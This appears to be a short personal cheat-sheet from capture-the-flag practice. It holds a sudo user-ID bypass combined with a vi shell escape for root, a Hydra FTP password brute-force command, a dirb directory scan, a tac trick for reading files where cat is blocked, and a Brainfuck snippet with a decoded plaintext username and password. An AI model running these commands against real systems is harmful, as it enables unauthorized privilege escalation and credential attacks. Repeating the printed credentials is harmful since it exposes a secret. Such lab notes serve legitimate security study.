# Vi editor and sudo vulnerability

- Type:
````shell
sudo -u#-1 /usr/bin/vi file
````
- Then type on the vi finder menu: `!/bin/sh`

# Brainfuck coding language
- An example:
````brainfuck
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <

## Equivalent to: 
User: eli
Password: DSpDiM1wAEwid
````
- Decoder/Encoder here: https://www.dcode.fr/brainfuck-language

# Hydra by ftp
````shell
hydra -l user -P passwords.txt ftp://<target-ip>
````

# Dirb basic command
````shell
dirb http://10.10.233.35/ /usr/share/wordlists/dirb/common.txt 
````

# Tac for print and read files
- Use the tool tac for printing files when cat, vi, vim... are blocked or not permitted:
````shell
tac /home/file.txt
````